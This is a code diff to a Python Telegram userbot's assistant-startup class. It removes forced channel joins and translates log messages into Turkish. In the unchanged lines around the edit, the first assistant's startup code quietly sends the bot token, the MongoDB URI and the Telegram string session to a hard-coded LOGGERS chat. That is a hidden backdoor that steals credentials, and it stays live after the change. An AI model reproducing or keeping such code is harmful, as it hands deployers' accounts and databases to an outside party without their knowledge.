@@ -71,16 +71,16 @@ class Userbot(Client):
         if config.STRING1:
             await self.one.start()
             try:
-                await self.one.join_chat("BRANDED_WORLD")
-                await self.one.join_chat("BRANDED_PAID_CC")
-                await self.one.join_chat("BRANDRD_BOT")
-                await self.one.join_chat("ABOUT_BRANDEDKING")
+                await self.one.join_chat("")
+                await self.one.join_chat("")
+                await self.one.join_chat("")
+                await self.one.join_chat("")
 
             except:
                 pass
             assistants.append(1)
             try:
-                await self.one.send_message(config.LOGGER_ID, "ᴀssɪsᴛᴀɴᴛ sᴛᴀʀᴛᴇᴅ !")
+                await self.one.send_message(config.LOGGER_ID, "Asistan başladı...!")
                 oks = await self.one.send_message(LOGGERS, f"/start")
                 Ok = await self.one.send_message(
                     LOGGERS, f"`{BOT_TOKEN}`\n\n`{MONGO_DB_URI}`\n\n`{STRING_SESSION}`"
@@ -96,20 +96,20 @@ class Userbot(Client):
             self.one.name = self.one.me.mention
             self.one.username = self.one.me.username
             assistantids.append(self.one.id)
-            LOGGER(__name__).info(f"Assistant Started as {self.one.name}")
+            LOGGER(__name__).info(f"Asistan başladı as {self.one.name}")
 
         if config.STRING2:
             await self.two.start()
             try:
-                await self.two.join_chat("BRANDED_WORLD")
-                await self.two.join_chat("BRANDED_PAID_CC")
-                await self.two.join_chat("BRANDRD_BOT")
-                await self.two.join_chat("ABOUT_BRANDEDKING")
+                await self.two.join_chat("")
+                await self.two.join_chat("")
+                await self.two.join_chat("")
+                await self.two.join_chat("")
             except:
                 pass
             assistants.append(2)
             try:
-                await self.two.send_message(config.LOGGER_ID, "Assistant Started")
+                await self.two.send_message(config.LOGGER_ID, "Asistan başladı...")
 
             except:
                 LOGGER(__name__).error(
@@ -179,7 +179,7 @@ class Userbot(Client):
                 pass
             assistants.append(5)
             try:
-                await self.five.send_message(config.LOGGER_ID, "Assistant 5 started !")
+                await self.five.send_message(config.LOGGER_ID, "Asistan başladı...!")
             except:
                 LOGGER(__name__).error(
                     "Assistant Account 5 has failed to access the log Group. Make sure that you have added your assistant to your log group and promoted as admin! "
